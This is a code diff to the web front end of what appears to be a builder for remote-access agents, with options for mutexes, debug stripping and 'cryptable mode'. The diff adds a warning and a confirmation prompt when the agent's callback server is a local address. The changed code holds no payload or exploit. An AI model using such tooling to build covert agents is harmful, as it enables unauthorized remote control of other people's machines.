@@ -8,6 +8,7 @@ import {
   revealElement,
   staggerChildren,
 } from "./motion.js";
+import { isLocalServerAddress } from "./build-server-url.js";
 
 const form = document.getElementById("build-form");
 const buildBtn = document.getElementById("build-btn");
@@ -33,6 +34,7 @@ const pluginsLink = document.getElementById("plugins-link");
 const rawServerListCheckbox = document.getElementById("raw-server-list");
 const serverUrlInput = document.getElementById("server-url");
 const serverUrlCurrentBtn = document.getElementById("server-url-current-btn");
+const serverUrlLocalWarning = document.getElementById("server-url-local-warning");
 const solMemoCheckbox = document.getElementById("sol-memo");
 const solSettings = document.getElementById("sol-settings");
 const profileSelect = document.getElementById("build-profile-select");
@@ -200,8 +202,29 @@ function updateServerUrlPlaceholder() {
 function updateServerUrlCurrentButton() {
   if (!serverUrlCurrentBtn) return;
   const isRaw = rawServerListCheckbox?.checked ?? false;
+  const isCurrentHost = !isRaw
+    && !!serverUrlInput?.value.trim()
+    && stripServerUrlPrefix(serverUrlInput.value) === getCurrentServerUrlForMode();
   serverUrlCurrentBtn.classList.toggle("hidden", isRaw);
   serverUrlCurrentBtn.disabled = isRaw;
+  serverUrlCurrentBtn.setAttribute("aria-pressed", String(isCurrentHost));
+  serverUrlCurrentBtn.classList.toggle("bg-slate-800/70", !isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("border-slate-700", !isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("text-slate-300", !isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("bg-blue-600", isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("border-blue-400", isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("text-white", isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("shadow-lg", isCurrentHost);
+  serverUrlCurrentBtn.classList.toggle("shadow-blue-950/50", isCurrentHost);
+}
+
+function updateLocalServerWarning() {
+  const showWarning = isLocalServerAddress(serverUrlInput?.value);
+  serverUrlLocalWarning?.classList.toggle("hidden", !showWarning);
+  serverUrlInput?.classList.toggle("border-slate-700", !showWarning);
+  serverUrlInput?.classList.toggle("border-red-500", showWarning);
+  serverUrlInput?.setAttribute("aria-invalid", String(showWarning));
+  updateServerUrlCurrentButton();
 }
 
 let isBuilding = false;
@@ -893,6 +916,7 @@ function applyFormSettings(settings) {
   }
   if (serverUrlInput && rawServerListCheckbox) {
     updateServerUrlPlaceholder();
+    updateLocalServerWarning();
   }
   applyCryptableMode(document.getElementById("cryptable-mode")?.checked || false);
   updateWebrtcFirewallPromptOption();
@@ -1141,6 +1165,11 @@ function updateWebrtcFirewallPromptOption() {
 }
 
 restoreFormSettings();
+if (serverUrlInput && !serverUrlInput.value.trim()) {
+  serverUrlInput.value = getCurrentServerUrlForMode();
+  saveFormSettings();
+}
+updateLocalServerWarning();
 initAccordions();
 initBuilderTabs();
 loadBuildPlugins();
@@ -1177,6 +1206,7 @@ if (rawServerListCheckbox && serverUrlInput) {
       serverUrlInput.value = stripServerUrlPrefix(current);
     }
     updateServerUrlPlaceholder();
+    updateLocalServerWarning();
   });
 
   if (serverUrlCurrentBtn) {
@@ -1189,6 +1219,7 @@ if (rawServerListCheckbox && serverUrlInput) {
       serverUrlInput.dispatchEvent(new Event("input", { bubbles: true }));
       serverUrlInput.dispatchEvent(new Event("change", { bubbles: true }));
       saveFormSettings();
+      updateLocalServerWarning();
       serverUrlInput.focus();
     });
   }
@@ -1196,7 +1227,10 @@ if (rawServerListCheckbox && serverUrlInput) {
   // Live-strip protocol prefixes in non-raw mode so the field stays clean and
   // the user sees their typo corrected immediately.
   serverUrlInput.addEventListener("input", () => {
-    if (rawServerListCheckbox.checked) return;
+    if (rawServerListCheckbox.checked) {
+      updateLocalServerWarning();
+      return;
+    }
     const before = serverUrlInput.value;
     const after = stripServerUrlPrefix(before);
     if (after !== before) {
@@ -1204,6 +1238,7 @@ if (rawServerListCheckbox && serverUrlInput) {
       serverUrlInput.value = after;
       try { serverUrlInput.setSelectionRange(caret, caret); } catch {}
     }
+    updateLocalServerWarning();
   });
 }
 
@@ -2022,6 +2057,12 @@ form?.addEventListener("submit", async (e) => {
   const rawServerList = form.querySelector("#raw-server-list")?.checked || false;
   const serverUrlRaw = form.querySelector("#server-url").value.trim();
   const serverUrl = rawServerList ? serverUrlRaw : stripServerUrlPrefix(serverUrlRaw);
+  if (isLocalServerAddress(serverUrlRaw) && !confirm(
+    "WARNING: LOCAL SERVER ADDRESS\n\nThis agent will not be able to connect from outside this machine or local network. Outbound connections from remote networks will fail.\n\nBuild with this local address anyway?"
+  )) {
+    serverUrlInput?.focus();
+    return;
+  }
   const mutex = form.querySelector("#mutex")?.value.trim() || "";
   const disableMutex = form.querySelector('input[name="disable-mutex"]')?.checked || false;
   const stripDebug = form.querySelector('input[name="strip-debug"]').checked;
